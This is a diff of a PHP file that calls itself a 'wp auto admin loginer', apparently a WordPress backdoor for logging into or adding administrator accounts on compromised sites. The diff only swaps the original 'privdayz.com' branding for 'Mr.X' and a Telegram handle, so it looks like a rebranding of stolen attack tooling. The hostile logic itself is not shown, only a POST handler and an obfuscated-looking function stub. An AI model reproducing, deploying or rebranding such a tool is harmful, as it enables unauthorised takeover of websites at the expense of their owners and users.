@@ -1,6 +1,5 @@
 <?php
-// privdayz.com v1 | wp auto admin loginer
-// github.com/privdayzcom/wp-auto-admin-loginer
+// Mr.X v1 | wp auto admin loginer
 header('Content-Type: text/html; charset=UTF-8');
 function jdk2g1d($r = null, $q = 0) {
     if ($q > 8) return false;
@@ -58,7 +57,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>privdayz.com | wp auto admin loginer</title>
+<title>Mr.X | wp auto admin loginer</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
@@ -68,7 +67,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
 <body>
 <div id="w1">
     <div class="h1">
-        <span class="led"></span> privdayz.com <span style="color:#fff;font-weight:400;">wp auto admin loginer</span>
+        <span class="led"></span> Mr.X <span style="color:#fff;font-weight:400;">WP admin Adder Telegram:@jackleet </span>
     </div>
     <div class="sct">users</div>
     <div class="tbx">
